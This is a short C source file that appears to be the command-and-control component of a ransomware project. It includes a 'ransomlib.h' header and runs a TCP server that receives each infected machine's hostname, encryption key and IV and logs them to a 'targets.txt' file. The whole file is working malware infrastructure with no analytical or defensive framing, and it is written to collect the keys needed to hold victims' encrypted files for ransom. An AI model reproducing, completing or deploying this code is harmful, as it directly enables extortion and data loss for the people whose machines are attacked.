#include "ransomlib.h"
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>

int write_to_file(char * hostname, char * key, char * iv)
{
    printf("New entry from %s\n", hostname);

    FILE * file = fopen("targets.txt", "a");

    fprintf(file, "\"%s\" - %s - %s\n", hostname, key, iv);

    fclose(file);
}

int main(void)
{
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    int address_len = sizeof(address);

    int server = socket(AF_INET, SOCK_STREAM, 0);

    bind(server, (struct sockaddr *)&address, address_len);

    listen(server, 3);

    while (1)
    {
        int new_socket = accept(server, (struct sockaddr*)&address, (socklen_t*)&address_len);

        char hostnameBuffer[BUFSIZE];
        char keyBuffer[BUFSIZE];
        char ivBuffer[BUFSIZE];

        read(new_socket, hostnameBuffer, BUFSIZE);
        read(new_socket, keyBuffer, BUFSIZE);
        read(new_socket, ivBuffer, BUFSIZE);

        write_to_file(hostnameBuffer, keyBuffer, ivBuffer);
    }
}